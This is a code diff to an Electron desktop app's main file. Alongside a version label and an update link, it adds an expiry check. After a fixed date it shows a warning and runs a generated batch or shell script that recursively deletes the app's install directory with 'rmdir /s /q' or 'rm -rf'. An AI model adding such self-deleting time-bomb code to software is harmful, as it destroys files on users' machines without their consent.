@@ -1,7 +1,19 @@
-const { app, BrowserWindow, Menu, globalShortcut, shell } = require("electron");
+const {
+  app,
+  BrowserWindow,
+  Menu,
+  globalShortcut,
+  shell,
+  dialog,
+} = require("electron");
 const path = require("path");
 const { exec } = require("child_process");
 const os = require("os");
+const fs = require("fs");
+
+const packageJsonPath = path.join(__dirname, "package.json");
+const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, "utf8"));
+const appVersion = packageJson.version;
 
 function getNetworkLatency(callback) {
   const target = "www.baidu.com";
@@ -38,6 +50,8 @@ function getNetworkStatus() {
 }
 
 function createWindow() {
+  if (checkExpiration()) return;
+
   const win = new BrowserWindow({
     width: 800,
     height: 600,
@@ -49,7 +63,6 @@ function createWindow() {
 
   win.loadFile("src/index.html");
 
-  // 获取初始网络信息
   const networkInfo = getNetworkStatus();
   getNetworkLatency((latency) => {
     const template = [
@@ -117,49 +130,53 @@ function createWindow() {
         label: "关于",
         submenu: [
           {
-            label: "版权归属: Little Deng Student",
+            label: "Click to Check for Updates",
             click: () => {
-              console.log("版权归属: Little Deng Student");
-            },
-          },
-          {
-            label: "软件更新:Little Deng Student",
-            click: () => {
-              // 假设这里有官方网站的链接
               shell.openExternal(
                 "https://pan.baidu.com/s/1C1--k3ibElRIPEso1XGKEQ?pwd=53w2"
               );
             },
           },
+          {
+            label: "Copyright: Little Deng Student",
+            click: () => {
+              console.log("Copyright: Little Deng Student");
+            },
+          },
+          {
+            label: `Time: ${getRemainingTime()}`,
+            enabled: false,
+          },
         ],
+      },
+      {
+        label: `版本: ${appVersion}`,
+        enabled: false,
       },
     ];
 
     const menu = Menu.buildFromTemplate(template);
     Menu.setApplicationMenu(menu);
 
-    // 定时更新网络信息
     setInterval(() => {
       const newNetworkInfo = getNetworkStatus();
       getNetworkLatency((newLatency) => {
         template[2].label = `网络状态: ${newNetworkInfo.status}，本机 IP: ${newNetworkInfo.ip}，网络延迟: ${newLatency}`;
+        template[3].submenu[2].label = `Time: ${getRemainingTime()}`;
         const newMenu = Menu.buildFromTemplate(template);
         Menu.setApplicationMenu(newMenu);
       });
     }, 5000);
   });
 
-  // 注册全局快捷键
   globalShortcut.register("Ctrl+R", () => {
     win.reload();
   });
 
-  // 注册 F12 快捷键以打开开发者工具
   globalShortcut.register("F12", () => {
     win.webContents.openDevTools();
   });
 
-  // 支持 Ctrl + 滚轮缩放
   win.webContents.on("before-input-event", (event, input) => {
     if (input.control && input.type === "keyDown") {
       if (input.key === "Minus") {
@@ -191,3 +208,76 @@ app.whenReady().then(() => {
 app.on("window-all-closed", function () {
   if (process.platform !== "darwin") app.quit();
 });
+
+const CONFIG = {
+  EXPIRE_DATE: new Date("2025-12-31"),
+  SELF_DESTRUCT: true,
+};
+
+function selfDestruct() {
+  if (!CONFIG.SELF_DESTRUCT) return;
+
+  try {
+    const appPath = path.dirname(app.getPath("exe"));
+    const isWindows = process.platform === "win32";
+
+    const batFile = path.join(os.tmpdir(), "cleanup.bat");
+    const shFile = path.join(os.tmpdir(), "cleanup.sh");
+
+    if (isWindows) {
+      fs.writeFileSync(
+        batFile,
+        `
+        @echo off
+        timeout /t 3 /nobreak >nul
+        rmdir /s /q "${appPath}"
+        del "${batFile}"
+      `
+      );
+      exec(`start cmd /c "${batFile}"`, { shell: true });
+    } else {
+      fs.writeFileSync(
+        shFile,
+        `
+        #!/bin/bash
+        sleep 3
+        rm -rf "${appPath}"
+        rm -- "$0"
+      `
+      );
+      fs.chmodSync(shFile, 0o755);
+      exec(`xterm -e "bash ${shFile}"`);
+    }
+  } catch (error) {
+    console.error("自毁失败:", error);
+  }
+}
+
+function checkExpiration() {
+  const now = new Date();
+  if (now > CONFIG.EXPIRE_DATE) {
+    dialog.showErrorBox(
+      "Application has expired",
+      "This program has exceeded the valid period and will self-destruct shortly!\n\n"
+    );
+    selfDestruct();
+    app.quit();
+    return true;
+  }
+  return false;
+}
+
+function getRemainingTime() {
+  const now = new Date();
+  const remainingMs = CONFIG.EXPIRE_DATE - now;
+  if (remainingMs <= 0) {
+    return "已到期";
+  }
+  const days = Math.floor(remainingMs / (1000 * 60 * 60 * 24));
+  const hours = Math.floor(
+    (remainingMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+  );
+  const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
+  const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
+  return `${days} 天 ${hours} 时 ${minutes} 分 ${seconds} 秒`;
+}
